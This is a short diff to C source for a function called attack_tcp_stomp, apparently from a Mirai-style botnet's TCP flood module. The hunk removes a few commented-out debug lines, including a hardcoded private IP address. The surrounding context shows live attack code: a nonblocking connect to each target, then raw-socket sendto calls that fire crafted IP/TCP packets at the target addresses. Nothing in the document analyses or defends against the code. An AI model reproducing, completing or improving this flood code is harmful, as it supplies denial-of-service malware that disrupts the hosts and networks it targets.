@@ -357,9 +357,7 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
         else
             addr.sin_port = htons(dport);
 #ifdef DEBUG
-        //int a=inet_aton(addr.sin_addr);
         printf("[attack_tcp,]attack_tcp_stomp370:errno=%d\t  addrport=%d   addraddr=%d fd=%d\n",errno,addr.sin_port,addr.sin_addr,fd);
-        //addr.sin_addr=(uint32_t )INET_ADDR(192,168,0,114);
 #endif
         // Actually connect, nonblocking
         connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));//////////////////////////////////////////////////////////////////////////
@@ -521,7 +519,6 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
             sendto(rfd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
         }
 #ifdef DEBUG
-            //break;
             if (errno != 0)
                 printf("errno = %d\n", errno);
 #endif
